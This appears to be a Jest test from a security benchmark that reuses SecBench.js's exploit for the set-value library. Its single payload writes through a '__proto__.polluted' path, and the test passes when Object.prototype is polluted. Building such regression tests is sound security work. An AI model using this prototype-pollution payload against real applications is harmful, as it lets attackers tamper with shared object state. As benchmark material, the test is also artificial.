// Prototype pollution through the path argument of set-value (fixed version).
// Same payload as SecBench.js's exploit for the vulnerable version.
// Passes when the exploit succeeds: Object.prototype got polluted.
test("set-value pollutes Object.prototype through __proto__", () => {
  const set = require("set-value");
  try {
    set({}, "__proto__.polluted", "yes");
  } catch (e) {}
  expect({}.polluted).toBe("yes");
});
